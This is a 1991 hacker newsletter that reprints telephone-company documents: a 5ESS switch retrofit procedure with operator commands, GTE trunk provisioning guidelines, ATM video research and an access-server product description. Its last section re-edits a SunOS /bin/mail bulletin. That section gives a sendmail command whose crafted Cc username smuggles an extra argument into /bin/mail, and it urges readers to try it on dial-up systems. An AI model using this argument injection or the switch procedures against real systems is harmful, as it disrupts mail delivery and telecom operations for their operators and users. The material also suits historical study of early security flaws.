@@ -1,0 +1,692 @@
+ 
+                     --=] National Security Anarchists [=-- 
+                          --=] Volume I, Issue II [=-- 
+                        --=] Date Release: 06/23/91 [=-- 
+ 
+ 
+                             == NSA Introduction == 
+ 
+   Welcome to the second release of NSA newsletter.  We have gotten quite a 
+   response from our first newsletter, hope you get as much as a orgasm off 
+   this one.  Now let's get serious... 
+ 
+------------------------------------------------------------------------------- 
+Table of Contents 
+ 
+ Section    Contents 
+---------  -------------------------------------------------- 
+   2.0      NSA Introduction 
+   2.1      Table of Contents 
+   2.2      5ESS Switch, Software Release Retrofit Procedures 
+   2.3      Trunk Port Capacity Provisioning for COs 
+   2.4      ATM Research 
+   2.5      Teleos: New Access Server Enhancements 
+   2.6      SunOS /bin/mail Vulnerability/Credit: Sun/Os 
+   2.7      NSA Information 
+ 
+------------------------------------------------------------------------------- 
+ 
+                     --=] National Security Anarchists [=-- 
+                          --=] Volume I, Issue II [=-- 
+                               --=] Presents [=-- 
+ 
+                               == 5ESS Switch == 
+                   == Software Release Retrofit Procedures == 
+                       == 5E4 to 5E5 Software Releases == 
+                             == AT&T 235-105-244 == 
+ 
+ 
+   GENERAL 
+ 
+   This addendum supplements AT&T 235-105-244, Issue 1.03.  It is to be 
+   placed at the beginning of the manual.  The information included in 
+   this addendum will be incorporated into the next regular update of the 
+   manual. 
+ 
+   This addendum is issued to provide changes which have become apparent 
+   since the last issue of the manual. 
+ 
+   CHANGES TO MANUAL 
+ 
+   Page 5-88, Step (replace) 
+ 
+   3. The following step may be performedin teleprocessing offices to provide 
+      backup AMA data in the vent that data from the final teleprocessing 
+      session is lost or mutilated at the host collector.  In performing this 
+      step, the time interval from now to the system initialization is 
+      increased by the amount of time required to generate the AMA tape. 
+ 
+      Caution: All AMA data recorded between the final AMA teleprocessing 
+               session and the initialization will be lost.  Although the 
+               following step will hlpe ensure the integrity of previously 
+               recorded AMA data, the amount of AMA data that will be lost at 
+               initialization time may increase by the amount of AMA data 
+               recorded during the aforementioned time interval. 
+ 
+      a. For offices that use teleprocessing, an optional manual AMA tape 
+         writing session to dump secondary AMA blocks can be performed at this 
+         time (AT&T 235-105-210, Procedure 3.19).  This tape should be saved 
+         for backup purposes. 
+ 
+ 
+   Page 5-89, Step 5a (replace) 
+ 
+    a.  Single-stream office - enter message: 
+ 
+        MSG   OP:AMA:DISK; 
+ 
+        Response:  REPT AMA DISK SUMMARY FOR STREAM STx 
+                        DISK IS CURRENTLY xx% FULL 
+                        NUMBER OF PRIMARY AMA BLOCKS IN USE 
+                        IS APPROXIMATELY: xx 
+ 
+        Comment :  Due to design constraints, there may be a small amount of 
+                   primary AMA data in use on disk at this point. 
+ 
+                   To read the remaining primary AMA records;, start another 
+                   AMA teleprocessing or tape session (repeat Step 2). 
+ 
+                   To minimize the loss of AMA records, continue to initiate 
+                   AMA sessions until the number of primary blocks in use 
+                   (given by OP:AMA:DISK) reaches an acceptable level given 
+                   call traffic. 
+ 
+ 
+   Page 5-93, Step 4 (replace) 
+ 
+   4. Note 1: If ONTCs are ACTIVE MAJOR/MINOR (that is, duplex) on MCC Page 
+              1209, uses S as the application parameter (to preserve stable 
+              calls).  If ONTCs are not duplex, use R sa the application 
+              parameter. 
+ 
+      Note 2: At this time, CU 1 contains 3 circuit packs that are not 
+              compatible with the 5E4 software release currently cycling in the 
+              AM. When CU 1 is forced on-line during the following initalizing 
+              sequence, the switch will immediately go into a DMERT Level 3 
+              recovery.  It is essential that the AM boot (42-S-54) be 
+              performed immediately after forcing CU 1 on-line. 
+ 
+   To perform the initialization, enter the following commands on the EAI Page: 
+ 
+   a. To force CU 1 on-line, enter: 
+ 
+      CMD                 11  Force CU 1 on-line, switch goes into level 3 
+                              recovery 
+      Force CU 1? (y/n)   y   Force CU 1 on-line after "y" is entered 
+ 
+   b. To set the apllication parameter, enter the following commands on the EAI 
+      Page: 
+ 
+      CMD                 42    Sets application parameter mode 
+      PARAMETER:        S or R  S saves stable calls; R does not 
+ 
+      WARNING: Verify thateither S or R apperas (and is backlighted) to the 
+               right of the APPL PARMA field on the EAI Page before proceeding. 
+               If the S or R is not present and backlighted, reenter the 42 and 
+               S/R commands again before proceeding to the boot. 
+ 
+   c. To perform the initialization, enter the following commands on the EAI 
+      Page: 
+ 
+      CMD                 54  Full AM boot on new software release 
+      Boot? (y/n)          y  Boot begins after "y" is entered 
+ 
+ 
+   Page 5-94, Section 5.6.7.1 (add after the last sentence) 
+ 
+   As the AM recovers, ovserve the ROP for Asserts.  If any Assers are 
+   received, analyze them using the Asserts Manual (AT&T 235-600-500). 
+ 
+ 
+   Page 5-98, section 5.610.1 (replace) 
+ 
+    1. To verify that AMA is recording properly, enter message: 
+ 
+       MSG   OP:AMA:STATUS; 
+ 
+       Response:  REPT AMA STATUS FOR STREAM STx 
+ 
+                      SEGMENT                STATUS 
+                    -----------            ---------- 
+                        1                    xxxxx 
+                        2                    xxxxx 
+                        3                    xxxxx 
+ 
+                   LAST TIME DISK WRITER WROTE TO DISK hh:mm YY/MM 
+ 
+       Comment: Save the ROP output for use in the next step. 
+ 
+       Note: The percent full (number records) of each of the three SEGMENTS 
+             will demonstrate the loading of AMA records in the SDS.  Each time 
+             the SEGMENT gets full, the disk writer writes that particular 
+             SEGMENT to disk.  The value of the segment has been written to 
+             disk after the boot. 
+ 
+        a. Enter the following message: 
+ 
+           MSG   OP:AMA:MAPS; 
+ 
+           Response:  REPT AMA DISK MAPS FOR STREAM ST1 
+                        WRITE PARTITION x READ PARTITION x 
+                        PARTITION x DISK MAP: 
+                         FPO:xx  LPO:xx    FPS:xx   LPS:xx 
+                         FSO:xx  LSO:xx    FSS:xx   LSS:xx 
+                         FBO:xx  LBO:xx    FBS:XX   LBS:XX 
+                           .       .         .        . 
+                           .       .         .        . 
+                           .       .         .        . 
+                           .       .         .        . 
+ 
+    2. Re-enter the message: 
+ 
+       MSG   OP:AMA:STATUS; 
+ 
+       Response:  REPT AMA STATUS FOR STREAM STx 
+ 
+                      SEGMENT                STATUS 
+                    -----------            ---------- 
+                        1                    xxxxx 
+                        2                    xxxxx 
+                        3                    xxxxx 
+ 
+                   LAST TIME DISK WRITER WROTE TO DISK hh:mm YY/MM 
+ 
+ 
+        a. Enter the following message: 
+ 
+           MSG   OP:AMA:MAPS; 
+ 
+           Response:  REPT AMA DISK MAPS FOR STREAM ST1 
+                        WRITE PARTITION x READ PARTITION x 
+                        PARTITION x DISK MAP: 
+                         FPO:xx  LPO:xx    FPS:xx   LPS:xx 
+                         FSO:xx  LSO:xx    FSS:xx   LSS:xx 
+                         FBO:xx  LBO:xx    FBS:XX   LBS:XX 
+                           .       .         .        . 
+                           .       .         .        . 
+                           .       .         .        . 
+                           .       .         .        . 
+ 
+ 
+    3. Note: The amount of time it will take to verify AMA recording depends on 
+             the amount of traffic on the switch.  If your office has light 
+             traffic, you should continue with the steps in this manual and 
+             return to Step 2 (above) 10 minutes until you are satisfied that 
+             AMA is recording properly. 
+ 
+             Compare the OP:AMA:STATUS output from Step 1 with the 
+             OP:AMA:STATUS output from Step 2. 
+ 
+             The amount of AMA recorded depends on the amount of traffic on the 
+             switch. 
+ 
+             To verify that AMA is writing to a segment, compare the percent 
+             full (number records) of the segments from Steps 1 and 2.  These 
+             should increase with traffic on the switch. 
+ 
+             When one segment fills, it should be written to disk and a new 
+             segmentwill begin to fill.  To verify that AMA has written to 
+             disk, check the LAST TIME DISK WRITER WROTE TO DISK - this value 
+             should not be 00:00 00/00. 
+ 
+             You can also verify the AMA has been written to disk by comparing 
+             the output of the OP:AMA:MAPS commands issued in Steps 1a and 2a. 
+             The second line of the output from the OP:AMA:MAPS gives a number 
+             after WRITE PARTITION.  Below this are listed the various 
+             partitions available.  Locate that partition corresponding  to the 
+             write partition number.  Within this report are values for LPO and 
+             LPS.  Thse values should increase when AMA is written to disk. 
+ 
+             If AMA has successfully written to disk and is writing into a new 
+             segment , AMA is recording properly.  If AMA is recording 
+             properly, proceed to the next section. 
+ 
+             If AMA is being recorded in one SEGMENT, but has not written to 
+             disk, proceed to the next section but continue to monitor AMA.  To 
+             continue the monitoring, reenter the OP:AMA:STATUS message evey 10 
+             minutes until the AMA successfully writes to disk. 
+ 
+             If all SEGMENTS still indicate EMPTY, seek techinal assistance. 
+ 
+             Caution: If at any time you are unsure that AMA is recorind 
+             properly, do not hesitate to seek technical assistance. 
+ 
+ 
+   Page 5-140, Table 5-5 
+ 
+   The first number under the PTN column should read 0 instead of 1. 
+ 
+ 
+   Page 5-148, Table 5-12 
+ 
+   The first number under the PTN column should read 0 instead of 1. 
+ 
+------------------------------------------------------------------------------- 
+ 
+                     --=] National Security Anarchists [=-- 
+                          --=] Volume I, Issue II [=-- 
+                               --=] Presents [=-- 
+ 
+                      == Traffic Engineering Guidelines == 
+                 == Trunk Port Capacity Provisioning for COs == 
+                             == EG-TFE-91.010.00 == 
+ 
+ 
+     EXECUTIVE OVERVIEW: 
+ 
+     This guideline provides standards for provisioning trunk capacity (analog 
+     and digital) in the central office switch.  This capacity consists of the 
+     forecasted amounts of trunks which terminate on the swithc, sas well as 
+     some quantity, method , to provide for unidentified, unforecasted 
+     requirements.  The intent is to ensure the trunk capacity for central 
+     office switches is engineered to cover the core engineering time frame, in 
+     such a manner as to meet the unexpected customer demand and/or deployment 
+     of unforeseen pari gain devices by GTE. 
+ 
+     The existing PCM process authorizes engineering for forecasted switch 
+     terminations to accommodate the message trunk forecast, the special 
+     services forecsat, and pair gain host/remote links (future).  This 
+     guideline provides instructions for the engineering of unforecasted 
+     miscellaneous switch terminations with COE core job/projects. 
+ 
+ 
+     GENERAL DISCUSSION: 
+ 
+     Competition is pushing GTE to respond to the customer on a shorter time 
+     interval.  In order to accomplish this, they must position GTE to allow 
+     for rapid Trunk service provisioning.  The availability of central office 
+     Trunk Terminations through controlled engineering for 5-10% unforeseen 
+     demand will ensure their ability to succesfully respond to customer demands 
+     in a timely manner.  The time required from customer request to 
+     determination of equipment required, ordering, installing, testing is not 
+     acceptable and is a contributing factor to GTE's loss of customer base. 
+     Proper provisioning of trunk circuits in the right exchanges is essential 
+     to responding to customers' needs. 
+ 
+     Agreements are imminent which will provide for planned future pair gain 
+     devices on the PCM by Planning.  Existing links for pair gain devices will 
+     be in the POTS/TTE trunk forecast.  Therefore, margin for these links are 
+     not provided via this process guideline. 
+ 
+     This guideline does not provide margin for the message circuit trunk 
+     forecast trunks.  The trunk forecasters will not build margin into the 
+     groups which they manage by the TTE program.  In other words, existing or 
+     imminent processes provide for switch terminations to accommodate TTE 
+     forecast and H/R links. 
+ 
+     Planning has concurred with their proposal to provide 5-10% margin for 
+     trunk terminations in electronic switches.  The decision on the precise 
+     amount of margin to be order should be made by the Traffic Engineer.  This 
+     decision will be based on familiarity with the specific wire center and 
+     service demands which have been experienced over the past several years, 
+     along with knowledge of the specific switch configuration.  Switches in 
+     remote, slow growth areas would obviously requirrreless margin than 
+     switches in metropolitan, high growth areas.  Tandem or class 4/5 switches 
+     may require larger margins due to the unpredictability of IXC demand. 
+ 
+ 
+     GUIDELINE INSTRUCTION: 
+ 
+     The existing PCM process authorizes engineering for forecasted switch 
+     terminations to accommodate the message trunk forecast, the special 
+     services forecast, and pair gain host/remote links (future).  This 
+     guideline provides instructions for the engineering of unforecasted 
+     miscellaneous switch terminations with COE core job/projects. 
+ 
+     Every core job/project should provision to accommodate unforeseen demand 
+     for central office trunk terminations in addition to the 
+     forecasted/projected requirements of the engineering period.  The 
+     unforeseen demand for trunk terminations will typically be engineered at 
+     5% margin for rural offices and 10% margin for metropolitan offices. 
+     Traffic Engineering of more than 10% Trunk Terminations margin will 
+     require Planning review/approval. 
+ 
+     Services that comprise unforeseen demand are: 
+ 
+         o DID   (on COE Forecast as lump sum) 
+ 
+         o WATS  (when served on trunks) 
+ 
+         o Switched HI CAPS/Switched Data (DTI resources) (This is to be 
+           forecasted by Market Forecasting as part of the CAF/SAL forecast.) 
+ 
+         o MISC. (analog and/or DTI) 
+ 
+     The central office switch common equipment capacity must be engineered to 
+     carry both forecasted and unforeseen demand traffic as if all trunks were 
+     incarry both forecasted and unforeseen demand traffic as if all trunks 
+     were in service by the end of the core period.  Twenty-four CCS per trunk 
+     should be used to properly provision the switch's capacity.  Application 
+     as two-way split fifty percent incoming and fifty percent outgoing is 
+     recommended unless that traffic engineer knows of local considerations 
+     which warrant a different application. 
+ 
+     When the engineer has determined the margin for the unforeseen demand, two 
+     important decisions need to be evaluated: A) exact trunk or T1 quantities, 
+     and B) associated CCS loads. 
+ 
+     A.  Trunk quantities - The exact number of margin trunks to be added 
+                            should be based on the TOGEN calculation of 
+                            required trunking and associated frames.  Both 
+                            analog and digital margin should be provided 
+                            (unless a digital switch as been provision with no 
+                            analog trunks for DID).  Margin trunks should be 
+                            calculated to fill frames where possible, and 
+                            consideration should also be given to the TCU 
+                            layout of the office. 
+ 
+     Note:  In all cases, when digital technology is the switch type, the 
+            analog trunk frames should be wired so card slots are available 
+            when shortages occur.  Digital trunk FIUs can hold two QSIC cards 
+            each, which provides four T1 saaapc lines.  Currently they have to 
+            pay right-to-use fees whenever a DTFIU is installed.  GTE is 
+            working to implement TRU fees paid as QSIC cards are installed. 
+            Once that is the case there will be value to not installing the 
+            QSIC cards, leaving slots open until they are needed. 
+ 
+     Example 1:  Metropolitan GTD-5 office requires 200 T1 spans for 
+                 forecasted/known trunking requirements. 
+ 
+                 200 T1 = 25 DTFIU 
+ 
+                  20 T1 - Recommended margin at 10% 
+ 
+                 220 T1 = 27.5 DTFIU 
+ 
+                 Recommendation - Provide 224 T1s to completely fill 28 DTFIUs. 
+                                  Analyze TCU/FIU layout to assess impact on 
+                                  TCU requirements. The DTFIU may be eliminated 
+                                  if it requires an additional TCU. 
+ 
+     Note:  It is understood this example is representative of a "typical" 
+            metropoloitan office.  Engineering judgement, based on specific 
+            site characteristics, may require more than 10% to be budgeted and 
+            installed (with proper approval by Palnning). 
+ 
+     Example 2:  Rural GTD-5 office requires 30 T1 spans for forecasted/known 
+                 trunking requirements. 
+ 
+                 30 T1 = 3.75 DTFIU 
+ 
+                  2 T1 - Recommended margin at 5% 
+ 
+                 32 T1 = 4.0 DTFIU 
+ 
+                 Recommendation - Analyze TCU/FIU layout.  If the fifth DTFIU 
+                                  can be built into existing TCU, then provide, 
+                                  if the fifth DTFIU would require another TCU, 
+                                  do not provide. 
+ 
+     B.  CCS loads - Once the trunk quantities have been determined, a margin 
+         trunk group should be built into the trunk summary.  A CCS load of 24 
+         CCS/trunk should be associated with these margin trunks so that common 
+         equipment wil be calculated to include these trunks (specific impact 
+         will be on TPC processors, MF receivers, and registers in the GTD-5 
+         technology). 
+ 
+     If additional TCUs and/or Digital Trunk FIus are required in the GTD5, or 
+     additional Switch Modules are requires in the 5ESS, or more than 10% 
+     margin is required, then Planning must review and provide 
+     authorization/funding. 
+ 
+------------------------------------------------------------------------------- 
+ 
+                     --=] National Security Anarchists [=-- 
+                          --=] Volume I, Issue II [=-- 
+                               --=] Presents [=-- 
+ 
+                               == ATM Research == 
+                             == GTE Project 552 == 
+ 
+ 
+        Asynchronous transfer mode (ATM) has been standardized as the target 
+      transfer mode for B-ISDN.  It is believed to be a highly flexible 
+      switching and multiplexing technique capable of supporting a wide range 
+      of broadband and narrowband services.  Although the conceptual view of 
+      ATM seems attractive, the feasibility of ATM in practice is uncertain for 
+      real-time services such as full-motion video, especially under the 
+      assumption that some degree of statistical multiplexing is desirable 
+      within the ATM network.  The objective of this project was to evaluate 
+      the technical feasibility and complexity of ATM for the delivery of four 
+      full-motion video services:  television distribution, video-on-demand, 
+      videoconferencing, and videotelephony.  The intra-LATA transport of these 
+      video services over and end-to-end ATM network with a standard B-ISDN/ATM 
+      interface was investigated. 
+ 
+        The approach was based on a top-down view of the scenario at three 
+      levels: services, network, and switching.  At the service level, the four 
+      types of video services and their related end-toend network transport 
+      requirements were characterized.  The effects of cell losses and cell 
+      delays on video quality were investigated.  At the network level, 
+      alternative service topologies were compared to find the preferred 
+      topology for deployment of each service (see Figure 552-1).  The network 
+      management and control issues were examined and traffic control methods 
+      were proposed.  At the switch level, the performance and drawbacks of 
+      proposed ATM switch architectures were evaluated for the purpose of 
+      switching full-motion video (see Figure 552-2).  Finally, the end-to-end 
+      transport requirements were related to the curretn state of ATM 
+      techonology to draw conclusions about the technical feasibility of each 
+      video service. 
+ 
+ 
+ 
+                                     Source 
+                             ________/    \_________ 
+                            /                       \ 
+                           /                         \ 
+                          /                           \ 
+                         /                             \ 
+                End Office/Base Unit          End Office/Base Unit 
+                    /        \                    /       \ 
+                   /   . .    \                  /   . .   \ 
+                  /            \                /           \ 
+                 /              \              /             \ 
+               BERLU          BERLU          BERLU         BERLU 
+                / \            / \            / \           / \ 
+               /   \          /   \          /   \         /   \<- Individualy 
+              / . . \        / . . \        / . . \       / . . \  Switched 
+    BISDN ------?-    Loops 
+ 
+ 
+     Figure 552-1: Preferred service topology for television distribution 
+                   services.  This topology minimizes the use of network 
+                   resources, ensures fast response to channel switching, and 
+                   mitigates ATM transport impairments. 
+ 
+ 
+ 
+     ____ _______ _________________ _______ _________________ _______ ____ 
+       . |  8x8  | .             . |  8x8  | .             . |  8x8  | . 
+       . |  SRM  | .             . |  SRM  | .             . |  SRM  | . 
+     __._|_______|_.___       ___._|_______|_.___       ___._|_______|_.__ 
+                       \     /                   \     / 
+                        \   /                     \   / 
+              .          \ /            .          \ /            . 
+          (8) .           X         (8) .           X         (8) . 
+              .          / \            .          / \            . 
+                        /   \                     /   \ 
+     ____ _______ _____/     \_____ _______ _____/     \_____ _______ ____ 
+       . |  8x8  | .             . |  8x8  | .             . |  8x8  | . 
+       . |  SRM  | .             . |  SRM  | .             . |  SRM  | . 
+     __._|_______|_._____________._|_______|_._____________._|_______|_.__ 
+ 
+ 
+ 
+ 
+     Figure 552-2: A multistage self-routing fabric used in the Fujitsu 
+                   FETEX-150 ATM switch.  Large ATM switches will be required 
+                   in order to offer enhanced video services to a large 
+                   customer base. 
+ 
+ 
+ 
+     Television Distribution - Among the four video services studied, TV 
+                               distribution services appear to be the most 
+                               feasible, but large-scale multicast ATM switches 
+                               will be required.  A network architecture that 
+                               allows switching as close to the customer as 
+                               possible is desirable. 
+ 
+     Videoconferencing       - Network management and control issues are 
+                               complex; the design, development, and deployment 
+                               of network suitable for videoconferencing will 
+                               be a major technical challenge in order to 
+                               guarantee quality of service interms of cell 
+                               delay/jitter and loss rate. 
+ 
+     Videotelephony          - For ubiquitous service, the complexity of 
+                               network level problems (e.g., traffic control, 
+                               network management) will be significant. Large 
+                               ATM switches will be required. 
+ 
+     Video-on-Demand         - For true point-to-point VOD, a robust ATM 
+                               backbone with processing capability for 
+                               mid-calling signaling will be required. At 
+                               present, such a network is not feasible, 
+                               although B-ISDN should have this capability. An 
+                               area-wide offering is feasible using "local" 
+                               video gateways installed at either the access 
+                               nodes or in remote units. 
+ 
+     Overall, it was concluded that ATM techonology is not yet ready for its 
+     role as a unified means of transport for B-ISDN.  Tha main obstacles lie 
+     in the areas of network traffic control and the development of large-scale 
+     switching systems.  Without effective solutions to these problems, any 
+     ubiquitous offernign of on-demand, full-motion video services on a public 
+     ATM network is not feasible in the near future. 
+ 
+------------------------------------------------------------------------------- 
+ 
+                     --=] National Security Anarchists [=-- 
+                          --=] Volume I, Issue II [=-- 
+                               --=] Presents [=-- 
+ 
+                  == Teleos: New Access Server Enhancements == 
+ 
+ 
+   Multi-Point Token Ring LAN Bridging provides a unique and cost-effective 
+   solution for customers that need to link multiple LAN sites only on an 
+   "as-needed" basis, with the speed (dynamic bandwidth) but without the 
+   incovneience and expense of T1 leased lines.  A Token Ring Interface United 
+   (TRIU) provides a 4 Megabit-per-second, IBM Token Ring Network-compliant 
+   interface which supports connections to the AS/400 and other IBM and non-IBM 
+   hosts, front-end processors and communication controllers that support Token 
+   Ring source routing. 
+ 
+   The multi-point feature dynamically establishes bridged connections between 
+   up to 32 remote locations.  The bridged channel is transparent to higher 
+   layer protocols on the private Token Ring Network.  The IAP6000 Access 
+   Server supports 56Kbps, 64 Kbps, 384 Kbps (H0) 1,472 Mbps (H10) and even n x 
+   64 Kbps capability.  For instance, a corporate user, for a given 
+   application, can "bundle" 4 x 64 Kbps B channels yielding 256 Kbps of 
+   bandwidth between locations.  H0 channels can be concatenated in this 
+   similar fashion.  Up to 32 B cahnnel bridge connections may be established 
+   dynamically, on a call-by-call basis, per single TRIU.  A total of eight 
+   TRIUs can be supported in a IAP6000 twenty-slot system. 
+ 
+   Fractional T1 support using intergrated access allows the user to permanetly 
+   assing channels in 64, 384 or 1,472 Kbps increments for heavy usage 
+   applications.  The user now has the option of defining that a certain amount 
+   of bandwidth over a single, intergrated network connection be "fixed" (or 
+   dedicated) for a particular application use.  With private line services 
+   over the same Primary Rate Interface access line.  For instance, users can 
+   create hybrid networks and use both switched and private line tariffs to 
+   optimize their network costs. 
+ 
+   Transparent autoconnect automatically sets up a switched digital call 
+   providing, in effect, virtual dedicated badnwidth on demand for users who 
+   cannot justify the costs of private lines.  The IAP6000 Access Server can be 
+   programmed through the system console to dial a specific remote location and 
+   leave the connection active.  In this mode, the call is monitored and if for 
+   any reason the connection is dropped, the IAP6000 Access Server 
+   automatically re-establishes the call. 
+ 
+   Dynamic event steram reproting enables the IAP6000 Access Server to relay 
+   network information it recieves from the public switched network to an 
+   adjunct information processor (PC, mini, mainframe).  The event steram link 
+   is a 9600 Kpbs, asynchronous, RS-232 interface.  Information provided over 
+   the D channel, and reported, includes: Calling Party Number Information; 
+   Called Party Number Infomration; Time and Date of the Call, and Call 
+   Type (Voice,Data).  Event stream reporting allows the IAP6000 Access Server 
+   to share ISDN D-channel network intelligence with non-ISDN CPE so customized 
+   applications such as call screening, call routing (dealer locator), 
+   automatic call back (for abandoned or busy calls) and secure dial-back 
+   services for comptuer access can be implemented. 
+ 
+------------------------------------------------------------------------------- 
+                     --=] National Security Anarchists [=-- 
+                          --=] Volume I, Issue II [=-- 
+                               --=] Presents [=-- 
+ 
+                      == SunOS /bin/mail Vulnerability == 
+                   == Sun/Os MicroSystem Security Bulletin = 
+                            == Re/Edited Version == 
+ 
+ 
+============================================================================ 
+System Versions : 4.03, 4.1, 4.11 
+Architectures   : Sun3, Sun3x, Sun4, Sun4c, Sun4/490_4.1_PSR_A 
+Obsoleted by    : System V Release 4 
+Synopsis        : /bin/mail can be caused to invoke a root shell if given 
+                  the proper arguments. 
+============================================================================ 
+ 
+ 
+   Synopsis Description: 
+ 
+   /bin/mail is the local delivery agent for sendmail.  In 
+   some particular instance, /bin/mail parse its argument incorrectly 
+   and therefore, mail are being drop into the bit bucket. 
+ 
+   If there are users that has "f" has the second character, you might want 
+   to try the following: (substitute "af" with anyuser with "f" as second 
+   character) 
+ 
+   From any machine except mailhost: 
+ 
+   /bin/lib/sendmail -t -v <<END 
+   From: anyuser 
+   to: anyuser 
+   Subject: test 
+   Cc: af          <-- substitute any username with second character as "f" 
+   test 
+ 
+   END 
+ 
+   When the mail arrived on mailhost, sendmail process will invoke 
+   /bin/mail with the following argument "/bin/mail -r anyuser -d af 
+   anyuser".  Now you are in trouble.  The following are different 
+   scenarios for /bin/mail. 
+ 
+   [1] /bin/mail -r anyuser -d af  <mailmessages            fine 
+   [2] /bin/mail -r anyuser -d anyone af ... <mailmessages  fine 
+   [3] /bin/mail -r anyuser -d af anyone ... <mailmessages  Ah a Bug 
+ 
+    In Case 3, /bin/mail thinks that you want to read mail instead of 
+    delivering mail.  Therefore, mail messages is lost. 
+ 
+    Now this probably won't work on most Internet Sun/Os Unix systems.  But ah 
+    this works just dandy on direct dail ups and other networks.  So go out 
+    and practice your molestations. 
+ 
+------------------------------------------------------------------------------ 
+ 
+                          National Security Anarchists 
+                     "Plagurism is the Basis of Creativity" 
+ 
+                                 ##  ## ###### ###### 
+                                ### ## ##     ##  ## 
+                               ###### ###### ###### 
+                              ## ###     ## ##  ## 
+                             ##  ## ###### ##  ## 
+ 
+------------------------------------------------------------------------------- 
+                          National Security Anarchists 
+                     "Plagurism is the Basis of Creativity" 
+                              All Rights Reserved 
+        Any modifications to this text file is a violation of copyright 
+                                  - (c) 1991 - 
+-------------------------------------------------------------------------------- 
+Downloaded From P-80 Systems 304-744-2253 
+ 
+Downloaded From P-80 International Information Systems 304-744-2253 12yrs+ 
